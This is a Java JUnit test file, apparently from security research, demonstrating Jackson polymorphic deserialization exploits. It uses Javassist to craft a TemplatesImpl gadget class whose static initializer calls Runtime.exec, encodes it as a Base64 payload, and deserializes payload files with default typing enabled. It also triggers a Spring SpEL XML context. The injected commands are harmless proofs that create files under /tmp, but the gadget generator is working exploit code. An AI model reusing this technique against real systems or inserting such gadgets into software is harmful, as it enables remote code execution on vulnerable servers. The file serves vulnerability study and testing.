package com.b1ngz.sec;

import com.b1ngz.sec.model.Target;
import com.b1ngz.sec.util.ResourceUtils;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;
import org.junit.Test;
import org.springframework.context.support.FileSystemXmlApplicationContext;
import org.springframework.core.io.ClassPathResource;

import static org.assertj.core.api.Assertions.assertThat;


/**
 * Created by b1ngz on 2018/9/8.
 */
public class JacksonTest {

    @Test
    public void test_generate_TemplatesImpl_transletBytecodes() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.get(Target.class.getName());
        // for mac os local test
//        String command = "open -a /Applications/Calculator.app";
        String command = "touch /tmp/prove1.txt";
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" + escapeCommand(command) + "\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] evilByteCodes = cc.toBytecode();
        String data = Base64.encodeBase64String(evilByteCodes);
        System.out.println(data);
    }

    @Test
    public void testReadFile() throws Exception {
        assertThat(ResourceUtils.readResourceFileAsStr("/payload_Spring.json.json")).isNotBlank();
        assertThat(ResourceUtils.readResourceFileAsStr("/payload_TemplatesImpl.json.json")).isNotBlank();
        assertThat(ResourceUtils.readResourceFileAsStr("/spel.xml")).isNotBlank();
    }

    @Test
    public void test_payload_TemplatesImpl() throws Exception {
        String payload = ResourceUtils.readResourceFileAsStr("/payload_Spring.json");
        ObjectMapper objectMapper = new ObjectMapper();
        objectMapper.enableDefaultTyping();
        objectMapper.readValue(payload, Target.class);
    }

    @Test
    public void test_payload_FileSystemXmlApplicationContext() {
        // touch /tmp/prove2.txt
        new FileSystemXmlApplicationContext(new ClassPathResource("classpath:spel.xml").getPath());
    }

    @Test
    public void test_ProcessBuilder() throws Exception {
        new ProcessBuilder("touch", "/tmp/prove2.txt").start();
    }


    private String escapeCommand(String command) {
        return command.replaceAll("\"", "\\\"");
    }
}
